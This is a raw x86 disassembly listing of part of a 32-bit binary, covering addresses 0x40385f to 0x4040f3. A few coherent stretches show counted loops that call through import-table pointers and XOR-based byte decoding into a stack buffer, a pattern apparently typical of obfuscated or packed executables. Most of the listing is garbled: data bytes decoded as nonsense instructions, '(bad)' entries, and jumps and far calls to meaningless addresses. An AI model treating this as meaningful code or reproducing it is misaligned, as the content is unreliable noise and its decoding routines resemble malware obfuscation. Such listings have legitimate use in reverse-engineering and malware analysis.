  40385f:	js     0x4038c0
  403861:	jae    0x40383d
  403863:	mov    esp,0xd19bfeba
  403868:	jbe    0x4038bd
  40386a:	sti    
  40386b:	jge    0x403819
  40386d:	pusha  
  40386e:	xor    al,0x5f
  403870:	ins    DWORD PTR es:[edi],dx
  403871:	inc    si
  403873:	jle    0x40381d
  403875:	popf   
  403876:	jbe    0x40386e
  403878:	addr16 cld 
  40387a:	or     dh,0x87
  40387d:	imul   edx,DWORD PTR [ebp+0x7d],0x13
  403881:	add    ecx,eax
  403883:	cdq    
  403884:	mov    ebp,0xbf65e23
  403889:	dec    edi
  40388a:	mov    esi,0x9ab650dd
  40388f:	or     edi,DWORD PTR [ecx+0x46]
  403892:	xchg   BYTE PTR [edi],al
  403894:	(bad)  [eax]
  403896:	ret    
  403897:	dec    esi
  403898:	mov    fs,WORD PTR [ebp-0x30]
  40389b:	add    al,0x27
  40389d:	adc    al,0x94
  40389f:	call   0x5f538543
  4038a4:	push   ebx
  4038a5:	fisubr DWORD PTR [esi+0xd]
  4038a8:	repnz in eax,dx
  4038aa:	mov    ch,0xad
  4038ac:	jne    0x4038a5
  4038ae:	fs jnp 0x40384f
  4038b1:	add    eax,0x54aca5eb
  4038b6:	mov    al,0x16
  4038b8:	das    
  4038b9:	sbb    eax,0xeccd0b6c
  4038be:	test   BYTE PTR [ebp+ebx*1+0x63],bl
  4038c2:	hlt    
  4038c3:	push   cs
  4038c4:	xchg   ecx,eax
  4038c5:	in     al,dx
  4038c6:	mov    dl,0x89
  4038c8:	addr16 jle 0x4038d9
  4038cb:	movups xmm7,XMMWORD PTR [ecx]
  4038ce:	xlat   BYTE PTR ds:[ebx]
  4038cf:	lea    ebx,[eax-0x338c4240]
  4038d5:	inc    edi
  4038d6:	out    0x55,al
  4038d8:	mov    eax,0x4a3611cc
  4038dd:	add    bh,0xe9
  4038e0:	or     al,0x81
  4038e2:	mov    ss,WORD PTR [ecx+eiz*8+0x33088fd5]
  4038e9:	rol    DWORD PTR [ebx],0xc2
  4038ec:	mov    al,BYTE PTR [ebx+eax*1+0x32729c]
  4038f3:	mov    BYTE PTR [edi+esi*1],al
  4038f6:	mov    eax,DWORD PTR [ebp-0x4]
  4038f9:	xor    eax,ecx
  4038fb:	lea    edx,[edx+eax*1+0x32729c]
  403902:	mov    eax,DWORD PTR [ebp-0x4]
  403905:	xor    eax,ecx
  403907:	mov    esi,0xffcd8d64
  40390c:	sub    esi,eax
  40390e:	add    esi,DWORD PTR [ebp+0x10]
  403911:	cmp    edx,esi
  403913:	jbe    0x4029f8
  403919:	pop    ebx
  40391a:	mov    eax,0xf89c8530
  40391f:	pop    edi
  403920:	pop    esi
  403921:	leave  
  403922:	ret    0xc
  403925:	push   ebp
  403926:	mov    ebp,esp
  403928:	sub    esp,0x58
  40392b:	mov    ecx,DWORD PTR [ebp+0x8]
  40392e:	mov    DWORD PTR ds:0x43442d,0x11
  403938:	cmp    DWORD PTR ds:0x43442d,0x0
  40393f:	je     0x40397b
  403945:	cmp    DWORD PTR ds:0x43442d,0x17
  40394c:	jne    0x403960
  403952:	push   0x43437a
  403957:	push   DWORD PTR [ebp-0x24]
  40395a:	call   DWORD PTR ds:0x432c26
  403960:	mov    eax,ds:0x43442d
  403965:	dec    eax
  403966:	mov    ds:0x43442d,eax
  40396b:	jmp    0x403938
  403970:	mov    eax,ds:0x432dca
  403975:	add    DWORD PTR ds:0x432de2,eax
  40397b:	mov    eax,0x8a3e
  403980:	xor    ax,WORD PTR [ecx+0x20]
  403984:	mov    ecx,0x3b04
  403989:	adc    DWORD PTR ds:0x4326f4,0x34fe
  403993:	add    ax,cx
  403996:	movzx  ecx,BYTE PTR ds:0x43441d
  40399d:	sub    DWORD PTR ds:0x4343a2,ecx
  4039a3:	movzx  eax,ax
  4039a6:	adc    ecx,DWORD PTR ds:0x434429
  4039ac:	mov    DWORD PTR [ebp-0xc],eax
  4039af:	and    ecx,0x4bd2
  4039b5:	mov    BYTE PTR [ebp-0x1],0x7f
  4039b9:	xor    ecx,ecx
  4039bb:	or     ecx,DWORD PTR ds:0x434396
  4039c1:	xor    ecx,DWORD PTR ds:0x43439a
  4039c7:	mov    DWORD PTR ds:0x434396,ecx
  4039cd:	lea    eax,[ebp-0x1]
  4039d0:	mov    DWORD PTR ds:0x432dbe,0x10
  4039da:	cmp    DWORD PTR ds:0x432dbe,0x0
  4039e1:	je     0x403a23
  4039e7:	cmp    DWORD PTR ds:0x432dbe,0x1d
  4039ee:	jne    0x403a11
  4039f4:	push   0x43438a
  4039f9:	push   0x43275d
  4039fe:	push   DWORD PTR [ebp-0xc]
  403a01:	push   0x5939
  403a06:	push   0x4c17
  403a0b:	call   DWORD PTR ds:0x432c2a
  403a11:	mov    ecx,DWORD PTR ds:0x432dbe
  403a17:	dec    ecx
  403a18:	mov    DWORD PTR ds:0x432dbe,ecx
  403a1e:	jmp    0x4039da
  403a23:	mov    DWORD PTR [ebp-0x10],eax
  403a26:	mov    al,BYTE PTR [ebp-0x1]
  403a29:	adc    DWORD PTR ds:0x4326f4,ecx
  403a2f:	mov    ecx,DWORD PTR [ebp-0x10]
  403a32:	xor    al,0x47
  403a34:	sub    al,0x37
  403a36:	and    DWORD PTR ds:0x43437e,0x4d53
  403a40:	mov    BYTE PTR [ecx],al
  403a42:	mov    DWORD PTR ds:0x432dde,0x1b
  403a4c:	cmp    DWORD PTR ds:0x432dde,0x0
  403a53:	je     0x403ab0
  403a59:	cmp    DWORD PTR ds:0x432dde,0xc
  403a60:	jne    0x403a7c
  403a66:	push   0x432de6
  403a6b:	push   DWORD PTR [ebp-0x28]
  403a6e:	push   0x43439e
  403a73:	push   DWORD PTR [ebp-0x28]
  403a76:	call   DWORD PTR ds:0x432c2e
  403a7c:	cmp    DWORD PTR ds:0x432dde,0xd
  403a83:	jne    0x403a98
  403a89:	xor    ecx,ecx
  403a8b:	xor    ecx,DWORD PTR ds:0x432dde
  403a91:	dec    ecx
  403a92:	mov    DWORD PTR ds:0x432dde,ecx
  403a98:	mov    ecx,DWORD PTR ds:0x432dde
  403a9e:	dec    ecx
  403a9f:	mov    DWORD PTR ds:0x432dde,ecx
  403aa5:	jmp    0x403a4c
  403aaa:	and    ecx,0x3444
  403ab0:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  403ab7:	mov    DWORD PTR [ebp-0x10],0xf89c8530
  403abe:	add    DWORD PTR ds:0x43439a,edi
  403ac4:	mov    eax,DWORD PTR [ebp-0x8]
  403ac7:	or     DWORD PTR ds:0x434396,ecx
  403acd:	mov    ecx,0x7510855
  403ad2:	jmp    0x403c17
  403ad7:	and    eax,0x555995f7
  403adc:	pop    ecx
  403add:	icebp  
  403ade:	jae    0x403a7c
  403ae0:	lods   eax,DWORD PTR ds:[esi]
  403ae1:	imul   ebp,DWORD PTR [ebx],0x7b
  403ae4:	(bad)  
  403ae5:	daa    
  403ae6:	mov    ch,0xec
  403ae8:	push   ds
  403ae9:	jo     0x403b5b
  403aeb:	sbb    BYTE PTR [edi+0x70],bh
  403aee:	jo     0x403acd
  403af0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403af1:	push   ecx
  403af2:	xor    DWORD PTR [esi+eiz*4+0x3383fdd7],edx
  403af9:	and    al,0xeb
  403afb:	jo     0x403a80
  403afd:	xlat   BYTE PTR ds:[ebx]
  403afe:	popa   
  403aff:	mov    bh,0x3f
  403b01:	(bad)  
  403b02:	stos   BYTE PTR es:[edi],al
  403b03:	das    
  403b04:	mov    bh,0x4
  403b06:	lea    edx,ds:0x8bf27a36
  403b0c:	and    ah,BYTE PTR [ebx+0xe]
  403b0f:	sbb    ebp,eax
  403b11:	ja     0x403b31
  403b13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b14:	add    al,0x92
  403b16:	sub    eax,0xdc1c3af4
  403b1b:	pop    ds
  403b1c:	sbb    eax,0xc7acbd37
  403b21:	addr16 (bad) 
  403b23:	dec    edx
  403b24:	scas   eax,DWORD PTR es:[edi]
  403b25:	(bad)  
  403b26:	aas    
  403b27:	and    ch,BYTE PTR [esi]
  403b29:	and    BYTE PTR [edi],0x9b
  403b2c:	xchg   ecx,eax
  403b2d:	(bad)  
  403b2f:	pop    edi
  403b30:	adc    esp,edx
  403b32:	and    BYTE PTR [esi+0x52af0467],bl
  403b38:	ret    
  403b39:	in     al,dx
  403b3a:	not    BYTE PTR [edi+0x14]
  403b3d:	loop   0x403b26
  403b3f:	push   esi
  403b40:	sub    DWORD PTR [eax-0x4b78be6f],eax
  403b46:	sub    esi,ebx
  403b48:	mov    ds:0xe891fc0d,al
  403b4d:	jle    0x403add
  403b4f:	bound  esp,QWORD PTR [eax-0x562ae4f2]
  403b55:	dec    esp
  403b56:	std    
  403b57:	mov    DWORD PTR [edi],0x7cd95de
  403b5d:	pop    ebp
  403b5e:	lock xchg BYTE PTR [edx+0x320f8678],bl
  403b65:	add    cl,0xe0
  403b68:	idiv   DWORD PTR [edi+0x13233ffd]
  403b6e:	mov    DWORD PTR [ecx-0x1f],esi
  403b71:	jecxz  0x403b39
  403b73:	test   DWORD PTR [edx+ecx*1-0x34],ecx
  403b77:	add    eax,ebp
  403b79:	and    edi,DWORD PTR [edx]
  403b7b:	lea    edx,[eax+0x224f75c9]
  403b81:	rcr    BYTE PTR [eax+0x500ee513],0x67
  403b88:	mov    edi,0x963e1fd6
  403b8d:	and    al,0x1b
  403b8f:	push   eax
  403b90:	cmp    al,dh
  403b92:	inc    ebp
  403b93:	stc    
  403b94:	mov    DWORD PTR [edx+0x1a],ecx
  403b97:	into   
  403b98:	fs push ecx
  403b9b:	sub    al,0x1e
  403b9d:	cmp    ah,bh
  403b9f:	leave  
  403ba0:	xchg   edx,eax
  403ba1:	in     eax,0x44
  403ba3:	push   cs
  403ba4:	in     eax,0xf2
  403ba6:	lods   eax,DWORD PTR ds:[esi]
  403ba7:	stc    
  403ba8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ba9:	ja     0x403bf6
  403bab:	outs   dx,DWORD PTR ds:[esi]
  403bac:	pop    edi
  403bad:	push   0xff182009
  403bb2:	push   esi
  403bb3:	xchg   edi,eax
  403bb4:	ins    DWORD PTR es:[edi],dx
  403bb5:	sbb    eax,ebx
  403bb7:	(bad)  
  403bb8:	xor    eax,0x5dfca298
  403bbd:	cmp    ah,0x8a
  403bc0:	push   0x59
  403bc2:	imul   ebx,edx,0xffffffaf
  403bc5:	(bad)  
  403bc6:	std    
  403bc7:	push   0x13
  403bc9:	cmp    al,0x3b
  403bcb:	retf   
  403bcc:	cmp    eax,0xcd7f814d
  403bd1:	mul    BYTE PTR [edi-0xc]
  403bd4:	add    esp,DWORD PTR [ebp-0x1f]
  403bd7:	lock push ebx
  403bd9:	je     0x403c41
  403bdb:	sub    edi,edx
  403bdd:	mov    bl,0x62
  403bdf:	sbb    BYTE PTR [eax+0x4a],0x64
  403be3:	(bad)  
  403be4:	sti    
  403be5:	cld    
  403be6:	inc    esi
  403be7:	inc    esp
  403be8:	not    BYTE PTR [eax]
  403bea:	ror    BYTE PTR [esi-0xb],1
  403bed:	inc    esi
  403bee:	cmc    
  403bef:	add    dl,BYTE PTR [ecx]
  403bf1:	inc    esi
  403bf2:	jmp    0x403be7
  403bf4:	popf   
  403bf5:	mov    ebp,0xd95b15b9
  403bfa:	and    ebp,DWORD PTR [ecx+eiz*2]
  403bfd:	sub    DWORD PTR [ebp+0x3031fdb7],0x4d561841
  403c07:	add    eax,0x54a9d5d
  403c0c:	mov    eax,ds:0xd288bc80
  403c11:	outs   dx,BYTE PTR ds:[esi]
  403c12:	les    edi,FWORD PTR [edi+0x56c6f903]
  403c18:	inc    esi
  403c19:	xor    eax,ecx
  403c1b:	mov    esi,0x32729c
  403c20:	sbb    DWORD PTR ds:0x434376,0x434421
  403c2a:	add    eax,esi
  403c2c:	mov    DWORD PTR ds:0x432dd6,0x19db
  403c36:	jmp    0x403c4d
  403c3b:	mov    DWORD PTR ds:0x43436a,0x1bda
  403c45:	mov    dl,BYTE PTR [ebp-0x1]
  403c48:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403c4c:	inc    eax
  403c4d:	cmp    eax,0x40
  403c50:	jmp    0x403d95
  403c55:	sbb    bl,BYTE PTR [ebx+eiz*1+0x1981a102]
  403c5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c5d:	scas   al,BYTE PTR es:[edi]
  403c5e:	xchg   ecx,eax
  403c5f:	sub    al,0x28
  403c61:	sbb    bh,BYTE PTR [edi+0x54]
  403c64:	pushf  
  403c65:	xchg   esp,eax
  403c66:	sbb    eax,0x7f187070
  403c6b:	jo     0x403cdd
  403c6d:	ins    BYTE PTR es:[edi],dx
  403c6e:	sbb    ecx,DWORD PTR [ecx+0x3d]
  403c71:	sbb    BYTE PTR [ebx],ch
  403c73:	mov    dh,0x45
  403c75:	sbb    ch,bl
  403c77:	lahf   
  403c78:	jmp    0x403c8a
  403c7a:	push   esp
  403c7b:	push   ebx
  403c7c:	add    ebp,DWORD PTR [edi]
  403c7e:	(bad)  
  403c7f:	jb     0x403c22
  403c81:	sbb    al,0x43
  403c83:	mov    edx,DWORD PTR [ecx-0x16]
  403c86:	repnz adc eax,0x7c1262f2
  403c8c:	and    al,0xa6
  403c8e:	imul   ebx,DWORD PTR [ebp-0x37c67c98],0x280089d
  403c98:	mov    BYTE PTR [eax-0x1cf0ba1b],dl
  403c9e:	cwde   
  403c9f:	adc    DWORD PTR [esi+0x6f8d78db],esi
  403ca5:	into   
  403ca6:	jmp    0x2ba7:0x6f86e1c8
  403cad:	stos   DWORD PTR es:[edi],eax
  403cae:	call   0x67c5c478
  403cb3:	xchg   edx,eax
  403cb4:	sbb    BYTE PTR [edi+0x75],0xfc
  403cb8:	pop    ds
  403cb9:	cld    
  403cba:	jno    0x403ccd
  403cbc:	cdq    
  403cbd:	hlt    
  403cbe:	in     al,dx
  403cbf:	sbb    eax,0x888a65f9
  403cc4:	jle    0x403ce8
  403cc6:	adc    eax,0x5e5b1c0a
  403ccb:	or     al,0xb9
  403ccd:	mov    edx,ds
  403ccf:	neg    esp
  403cd1:	push   edx
  403cd2:	cmp    BYTE PTR [ebp-0x21],bl
  403cd5:	out    0xc5,al
  403cd7:	adc    BYTE PTR [esi],ch
  403cd9:	adc    eax,0x412f0d28
  403cde:	cmc    
  403cdf:	mov    esi,DWORD PTR [ebx-0x357e6d84]
  403ce5:	add    eax,0xe4f3e910
  403cea:	push   es
  403ceb:	out    0xe0,al
  403ced:	test   BYTE PTR [edx-0x5074746f],ch
  403cf3:	push   0x5f
  403cf5:	imul   ebp,DWORD PTR [edx+0x368299c],0x38
  403cfc:	jg     0x403d21
  403cfe:	pop    edi
  403cff:	cs adc al,0xaa
  403d02:	push   edx
  403d03:	push   ebx
  403d04:	je     0x403d72
  403d06:	fsubr  DWORD PTR [edx+edi*2-0x3d]
  403d0a:	add    ebx,0x549b4e1a
  403d10:	call   0xf614:0x20068078
  403d17:	adc    eax,0x8c9f4ac
  403d1c:	dec    esp
  403d1d:	stos   BYTE PTR es:[edi],al
  403d1e:	(bad)  [edx]
  403d20:	pop    esp
  403d21:	stos   DWORD PTR es:[edi],eax
  403d22:	push   esp
  403d23:	or     DWORD PTR [edi],edx
  403d25:	ins    DWORD PTR es:[edi],dx
  403d26:	bound  eax,QWORD PTR [esi+0x45]
  403d29:	push   ds
  403d2a:	out    dx,al
  403d2b:	icebp  
  403d2c:	cli    
  403d2d:	mov    edi,0xc233197a
  403d32:	aam    0x9b
  403d34:	xor    cl,al
  403d36:	adc    cl,BYTE PTR [eax-0x6be06b7c]
  403d3c:	adc    cl,BYTE PTR [esi+edi*4+0x69]
  403d40:	retf   
  403d41:	ins    BYTE PTR es:[edi],dx
  403d42:	pop    ss
  403d43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d44:	or     eax,0xfd4bdc8a
  403d49:	pop    esi
  403d4a:	push   eax
  403d4b:	stos   DWORD PTR es:[edi],eax
  403d4c:	retf   
  403d4d:	add    bl,BYTE PTR [edx]
  403d4f:	jno    0x403d27
  403d51:	jecxz  0x403da3
  403d53:	xchg   esi,eax
  403d54:	inc    bp
  403d56:	xor    edi,DWORD PTR [edx+0x6d857028]
  403d5c:	inc    ebp
  403d5d:	lods   eax,DWORD PTR ds:[esi]
  403d5e:	test   BYTE PTR [eax-0x5038692a],bh
  403d64:	les    ecx,FWORD PTR ds:0x6e0b1c46
  403d6a:	push   edi
  403d6b:	jle    0x403d36
  403d6d:	xchg   esi,eax
  403d6e:	cmp    eax,0x1f97561b
  403d73:	and    ebx,DWORD PTR [ebx]
  403d75:	sbb    al,0x6c
  403d77:	jae    0x403d68
  403d79:	rol    BYTE PTR [ebp+ebx*4+0x3d8bf44e],1
  403d80:	call   FWORD PTR [esi]
  403d82:	out    0x57,al
  403d84:	je     0x403d2f
  403d86:	xor    eax,0xab1f325a
  403d8b:	fwait
  403d8c:	mov    ah,0x2d
  403d8e:	test   al,0xea
  403d90:	pop    ds
  403d91:	es call 0xfea0:0x820f317c
  403d99:	(bad)  
  403d9a:	dec    DWORD PTR [ebx+0x2581f855]
  403da0:	call   0x0:0x4343
  403da7:	add    cl,ch
  403da9:	push   cs
  403daa:	add    BYTE PTR [eax],al
  403dac:	add    BYTE PTR [ebx],dh
  403dae:	rol    BYTE PTR [ebx],0x5
  403db1:	call   0x9aa3:0x40004343
  403db8:	inc    ebx
  403db9:	inc    ebx
  403dba:	add    BYTE PTR [ebx+0x43439a3d],al
  403dc0:	add    BYTE PTR [ebx],dl
  403dc2:	jae    0x403dfe
  403dc8:	cmp    DWORD PTR ds:0x43439a,0xc
  403dcf:	jne    0x403dde
  403dd5:	push   DWORD PTR [ebp-0x1c]
  403dd8:	call   DWORD PTR ds:0x4329be
  403dde:	cmp    DWORD PTR ds:0x43439a,0xb
  403de5:	jne    0x403df9
  403deb:	xor    eax,eax
  403ded:	add    eax,DWORD PTR ds:0x43439a
  403df3:	inc    eax
  403df4:	mov    ds:0x43439a,eax
  403df9:	jmp    0x403dad
  403dfe:	mov    eax,DWORD PTR [ebp-0xc]
  403e01:	xor    edx,ecx
  403e03:	add    edx,esi
  403e05:	cmp    edx,eax
  403e07:	jmp    0x403f4c
  403e0c:	inc    ecx
  403e0d:	sub    al,0xb8
  403e0f:	xor    BYTE PTR [ebp+0x72],0x41
  403e13:	jmp    0x403d9a
  403e15:	inc    ebp
  403e16:	mov    al,0x72
  403e18:	dec    BYTE PTR [esi+esi*1]
  403e1b:	sbb    edi,DWORD PTR [esp+ebx*1+0x7f187070]
  403e22:	jo     0x403e94
  403e24:	jmp    0x2855d69f
  403e29:	push   cs
  403e2a:	or     dh,BYTE PTR [ebp+0x426628a0]
  403e30:	or     BYTE PTR [ebp-0x7c],dl
  403e33:	pop    esi
  403e34:	adc    BYTE PTR [ebx+0x3],bh
  403e37:	shr    BYTE PTR [edx-0x7e],cl
  403e3a:	mov    ds:0x3a8e4ac8,eax
  403e3f:	js     0x403e9b
  403e41:	les    edx,FWORD PTR [eax+ebp*2-0x24a3581f]
  403e48:	fimul  WORD PTR [ebx+0x27697f40]
  403e4e:	bound  eax,QWORD PTR [ecx-0x7f3eb05f]
  403e54:	scas   al,BYTE PTR es:[edi]
  403e55:	cli    
  403e56:	sub    al,0x79
  403e58:	cdq    
  403e59:	lahf   
  403e5a:	xchg   eax,esp
  403e5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e5d:	adc    BYTE PTR [edi],ah
  403e5f:	cmp    bl,BYTE PTR [ebx-0x77f3c48c]
  403e65:	bound  esp,QWORD PTR [ebx]
  403e67:	scas   eax,DWORD PTR es:[edi]
  403e68:	and    ah,BYTE PTR [edi]
  403e6a:	sbb    cl,BYTE PTR [edi]
  403e6c:	imul   esi,DWORD PTR [ebx+0x7ea883ca],0x66
  403e73:	mov    ecx,DWORD PTR [ebp+0x16]
  403e76:	push   es
  403e77:	out    dx,eax
  403e78:	mov    ah,0x89
  403e7a:	xor    BYTE PTR [edx+0x18],cl
  403e7d:	dec    edi
  403e7e:	xchg   DWORD PTR [ebp-0x312692a3],eax
  403e84:	or     eax,0x312b58c5
  403e89:	mov    ds:0x9d6bed36,eax
  403e8e:	test   al,0x86
  403e90:	pusha  
  403e91:	and    eax,0x91f81bec
  403e96:	mov    ebp,eax
  403e98:	sub    al,0x20
  403e9a:	push   0x8843e758
  403e9f:	push   ebp
  403ea0:	jnp    0x403f10
  403ea2:	push   ebp
  403ea3:	and    DWORD PTR [edi-0x518714ec],eax
  403ea9:	loop   0x403e5c
  403eab:	mov    al,0xa0
  403ead:	jl     0x403ecc
  403eaf:	ins    BYTE PTR es:[edi],dx
  403eb0:	pop    esi
  403eb1:	xor    eax,DWORD PTR ds:0x9ab7e4cb
  403eb7:	jp     0x403e91
  403eb9:	aas    
  403eba:	scas   eax,DWORD PTR es:[edi]
  403ebb:	mov    edi,0xa9a0ca82
  403ec0:	sbb    DWORD PTR [edx],esi
  403ec2:	push   ds
  403ec3:	cmp    bl,BYTE PTR ds:0x2adc71d7
  403ec9:	xchg   esp,eax
  403eca:	lods   eax,DWORD PTR ds:[esi]
  403ecb:	scas   al,BYTE PTR es:[edi]
  403ecc:	cmp    ebp,DWORD PTR [eax-0x9]
  403ecf:	or     al,0xef
  403ed1:	inc    esi
  403ed2:	repz jl 0x403ef4
  403ed5:	mov    dl,0x29
  403ed7:	(bad)  
  403ed8:	lock int 0x85
  403edb:	pusha  
  403edc:	inc    esi
  403edd:	mov    dh,bl
  403edf:	lds    esp,FWORD PTR ss:[ecx+0x49ecc563]
  403ee6:	mov    al,ds:0xb2c2d6cb
  403eeb:	retfw  0x15aa
  403eef:	jg     0x403ecc
  403ef1:	sbb    al,0x9e
  403ef3:	xor    bh,BYTE PTR [esi]
  403ef5:	cmp    al,0xa4
  403ef7:	pop    ebp
  403ef8:	addr16 xor bh,dl
  403efb:	addr16 fsubrp st(3),st
  403efe:	lods   al,BYTE PTR ds:[esi]
  403eff:	push   ss
  403f00:	push   0x3066b72c
  403f05:	push   edx
  403f06:	sahf   
  403f07:	(bad)  
  403f08:	adc    DWORD PTR [eax+ebx*8],ecx
  403f0b:	add    ebp,DWORD PTR [eax]
  403f0d:	lds    edx,FWORD PTR [ebx]
  403f0f:	dec    edx
  403f10:	loope  0x403ed8
  403f12:	cmp    al,0xa6
  403f14:	ret    
  403f15:	aaa    
  403f16:	dec    esp
  403f17:	outs   dx,BYTE PTR ds:[esi]
  403f18:	cwde   
  403f19:	cmp    DWORD PTR [edx+0x1c],ecx
  403f1c:	and    dh,0xec
  403f1f:	or     ah,BYTE PTR [ecx-0x2bdc144c]
  403f25:	lods   eax,DWORD PTR ds:[esi]
  403f26:	pusha  
  403f27:	sub    eax,DWORD PTR [eax-0x4cdbd71f]
  403f2d:	(bad)  
  403f2e:	outs   dx,BYTE PTR ds:[esi]
  403f2f:	jmp    0x403f16
  403f31:	xor    DWORD PTR [edi-0x48],esi
  403f34:	pop    ecx
  403f35:	out    0xdc,eax
  403f37:	nop
  403f38:	jmp    0x403ee6
  403f3a:	dec    ecx
  403f3b:	ss dec esp
  403f3d:	mov    eax,ds:0x6c6c8dbb
  403f42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f43:	xchg   ecx,eax
  403f44:	imul   ecx,DWORD PTR [ecx+0x50],0x28
  403f48:	mov    dh,0x5e
  403f4a:	fcmovne st,st(3)
  403f4c:	je     0x4040d7
  403f52:	push   ebx
  403f53:	push   edi
  403f54:	mov    edi,DWORD PTR [ebp+0x8]
  403f57:	mov    eax,0x8a3e
  403f5c:	xor    ax,WORD PTR [edi+edx*4+0x2]
  403f61:	mov    edi,0x3b04
  403f66:	add    ax,di
  403f69:	movzx  eax,ax
  403f6c:	mov    DWORD PTR [ebp-0x14],eax
  403f6f:	mov    eax,DWORD PTR [ebp+0x8]
  403f72:	movzx  eax,WORD PTR [eax+edx*4]
  403f76:	xor    eax,0x8a3e
  403f7b:	add    eax,edi
  403f7d:	mov    edi,DWORD PTR [ebp-0x14]
  403f80:	mov    BYTE PTR [ebp+edi*1-0x58],al
  403f84:	mov    eax,DWORD PTR [ebp-0xc]
  403f87:	inc    edx
  403f88:	cmp    edx,eax
  403f8a:	jne    0x403f54
  403f90:	pop    edi
  403f91:	jmp    0x4040d6
  403f96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f97:	fisubr DWORD PTR [edi-0x598e8c4b]
  403f9d:	jmp    0x4923f392
  403fa2:	xchg   ebp,edi
  403fa4:	nop
  403fa5:	pop    ecx
  403fa6:	sbb    esi,DWORD PTR fs:[eax+0x70]
  403faa:	sbb    BYTE PTR [edi+0x70],bh
  403fad:	jo     0x403ff1
  403faf:	cmp    ch,BYTE PTR [esi+0x75]
  403fb2:	in     al,dx
  403fb3:	call   0x27cba8dc
  403fb8:	data16 inc dl
  403fbb:	xchg   ebp,eax
  403fbc:	out    dx,eax
  403fbd:	mov    ds:0xe163e9b1,al
  403fc2:	sbb    BYTE PTR [eax],dh
  403fc4:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403fc6:	xchg   ebp,eax
  403fc7:	hlt    
  403fc8:	inc    esp
  403fc9:	jle    0x403f6f
  403fcb:	(bad)  
  403fcc:	aas    
  403fcd:	cmc    
  403fce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403fcf:	or     bl,BYTE PTR [ebp-0x2dcbca01]
  403fd5:	outs   dx,DWORD PTR ds:[esi]
  403fd6:	xchg   ecx,eax
  403fd7:	adc    DWORD PTR [eax-0x4fe48ccc],ebx
  403fdd:	in     eax,dx
  403fde:	into   
  403fdf:	xor    esp,ebx
  403fe1:	or     ecx,DWORD PTR [eax]
  403fe3:	xchg   esi,eax
  403fe4:	adc    eax,0x4f8ec684
  403fe9:	add    eax,0x6142c64c
  403fee:	xchg   esp,eax
  403fef:	fwait
  403ff0:	lds    esi,FWORD PTR [ebp+0x1533ef24]
  403ff6:	call   0xd599a622
  403ffb:	dec    ecx
  403ffc:	lahf   
  403ffd:	(bad)  
  403ffe:	jbe    0x403fee
  404000:	and    al,0xe1
  404002:	push   ecx
  404003:	(bad)  
  404004:	outs   dx,BYTE PTR ds:[esi]
  404005:	sub    BYTE PTR [edx+0x73],cl
  404008:	dec    ebp
  404009:	pop    ds
  40400a:	enter  0xb6b3,0xfc
  40400e:	sbb    ebx,edx
  404010:	nop
  404011:	or     dl,BYTE PTR [edx+0x54]
  404014:	das    
  404015:	mov    ebp,0x99316544
  40401a:	adc    eax,0x33bb0e23
  40401f:	shl    DWORD PTR [esi-0x3ca976bc],cl
  404025:	ret    0x7fc8
  404028:	mov    ebp,0x28534265
  40402d:	ret    0xbebf
  404030:	inc    edi
  404031:	repz and DWORD PTR [ebp+0x1f46598c],edx
  404038:	cld    
  404039:	retf   
  40403a:	pop    edx
  40403b:	(bad)  
  40403c:	sbb    BYTE PTR [ebp+eax*2+0x476346fc],0xc0
  404044:	hlt    
  404045:	cmp    edi,ebx
  404047:	mov    dl,0x8d
  404049:	nop
  40404a:	jmp    0xbf51:0x69cae4ba
  404051:	add    ecx,DWORD PTR [edx-0x7e]
  404054:	sub    DWORD PTR [edi+0x32],esp
  404057:	jp     0x404000
  404059:	xchg   edi,eax
  40405a:	xchg   esi,eax
  40405b:	fwait
  40405c:	in     al,dx
  40405d:	cwde   
  40405e:	mov    sp,0x2e3c
  404062:	fs jnp 0x40407a
  404065:	jl     0x40404f
  404067:	sbb    al,0xf8
  404069:	sub    DWORD PTR [esi+0xf5ae379],edi
  40406f:	(bad)  
  404070:	pop    ecx
  404071:	mov    eax,ds:0x465e768d
  404076:	jp     0x40406e
  404078:	push   eax
  404079:	xchg   esi,eax
  40407a:	shr    DWORD PTR [edx],1
  40407c:	pop    edi
  40407d:	sbb    al,BYTE PTR [eax]
  40407f:	outs   dx,BYTE PTR ds:[esi]
  404080:	aaa    
  404081:	adc    eax,0xe4a551b1
  404086:	in     eax,dx
  404087:	pop    ebx
  404088:	cmp    DWORD PTR [edx-0x41c224bf],0x5b
  40408f:	repz push ecx
  404091:	out    dx,al
  404092:	cmp    DWORD PTR [eax-0x4],ebp
  404095:	xor    ch,0x29
  404098:	jo     0x4040cd
  40409a:	ret    
  40409b:	out    0x29,al
  40409d:	push   esi
  40409e:	mov    edx,0x1ccdb3f3
  4040a3:	or     eax,0x377b3acb
  4040a8:	fisub  WORD PTR [ebx+eax*8]
  4040ab:	cmp    ch,BYTE PTR [esi+0x71]
  4040ae:	fisttp QWORD PTR [ecx]
  4040b0:	add    esi,DWORD PTR [edi]
  4040b2:	je     0x404074
  4040b4:	(bad)  
  4040b6:	or     dl,BYTE PTR [esi+0x18]
  4040b9:	xchg   edi,eax
  4040ba:	cmp    eax,0x9f09386f
  4040bf:	pushf  
  4040c0:	arpl   WORD PTR [ecx+0x390e87df],bp
  4040c6:	fsubr  DWORD PTR [ebp+0x477c2194]
  4040cc:	int    0xc5
  4040ce:	(bad)  
  4040cf:	data16 sub ah,BYTE PTR [ecx-0x5a99e242]
  4040d6:	pop    ebx
  4040d7:	mov    eax,DWORD PTR [ebp-0x8]
  4040da:	mov    edx,DWORD PTR [ebp+0x10]
  4040dd:	jmp    0x404222
  4040e2:	aaa    
  4040e3:	ins    DWORD PTR es:[edi],dx
  4040e4:	pop    ss
  4040e5:	int3   
  4040e6:	push   ebp
  4040e7:	jb     0x4040dc
  4040e9:	jno    0x404096
  4040eb:	pop    ebx
  4040ec:	imul   edi,DWORD PTR [edx+0x16987f0],0xc
  4040f3:	sbb    DWORD PTR [eax+0x70],esi
